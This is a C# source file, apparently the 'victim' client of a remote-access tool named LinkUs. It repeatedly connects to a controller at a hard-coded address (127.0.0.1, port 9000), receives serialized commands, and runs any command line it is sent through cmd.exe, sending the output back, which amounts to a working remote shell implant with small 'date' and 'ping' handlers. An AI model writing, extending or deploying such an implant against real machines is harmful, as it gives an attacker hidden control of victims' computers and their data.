using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using LinkUs.Core;

namespace LinkUs.Victim
{
    class Program
    {
        private static readonly UTF8Encoding Encoding = new UTF8Encoding();
        private static readonly ManualResetEvent ManualResetEvent = new ManualResetEvent(false);
        private static readonly ISerializer Serializer = new JsonSerializer();

        static void Main(string[] args)
        {
            Thread.Sleep(1000);
            while (true) {
                var connection = new SocketConnection();
                if (TryConnectSocketToHost(connection)) {
                    try {
                        var packageTransmitter = new PackageTransmitter(connection);
                        packageTransmitter.PackageReceived += (sender, package) => {
                            ProcessCommand(packageTransmitter, package);
                        };
                        packageTransmitter.Closed += (sender, eventArgs) => {
                            ManualResetEvent.Set();
                        };
                        ManualResetEvent.WaitOne();
                        Thread.Sleep(1000);
                    }
                    catch (Exception ex) {
                        Console.WriteLine(ex);
                    }
                }
                else {
                    Thread.Sleep(1000);
                }
            }
        }

        private static bool TryConnectSocketToHost(IConnection connection)
        {
            string host = "127.0.0.1";
            int port = 9000;

            try {
                Console.Write($"* Try to connect to host {host} on port {port} ... ");
                connection.Connect(host, port);
                Console.WriteLine("[SUCCESS]");
                return true;
            }
            catch (SocketException) {
                Console.WriteLine("[FAILED]");
                return false;
            }
        }

        private static void ProcessCommand(PackageTransmitter transmitter, Package package)
        {
            Console.WriteLine(package);

            var command = Serializer.Deserialize<Command>(package.Content);
            if (command.Name == "ExecuteRemoteCommandLine") {
                var executeRemoteCommand = Serializer.Deserialize<ExecuteRemoteCommandLine>(package.Content);
                var result = ExecuteBatch(executeRemoteCommand);
                var packageResponse = package.CreateResponsePackage(Serializer.Serialize(result));
                transmitter.Send(packageResponse);
            }
            else if (command.Name == "date") {
                var packageResponse = package.CreateResponsePackage(Serializer.Serialize(DateTime.Now.ToShortDateString()));
                transmitter.Send(packageResponse);
            }
            else if (command.Name == "ping") {
                var packageResponse = package.CreateResponsePackage(Serializer.Serialize("ok"));
                transmitter.Send(packageResponse);
            }
            else {
                var packageResponse = package.CreateResponsePackage(Serializer.Serialize("unknown command"));
                transmitter.Send(packageResponse);
            }
        }

        private static object ExecuteBatch(ExecuteRemoteCommandLine executeRemoteCommand)
        {
            var proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + executeRemoteCommand.CommandLine + " " + string.Join(" ", executeRemoteCommand.Arguments);
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();

            var result = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();
            return result;
        }
    }
}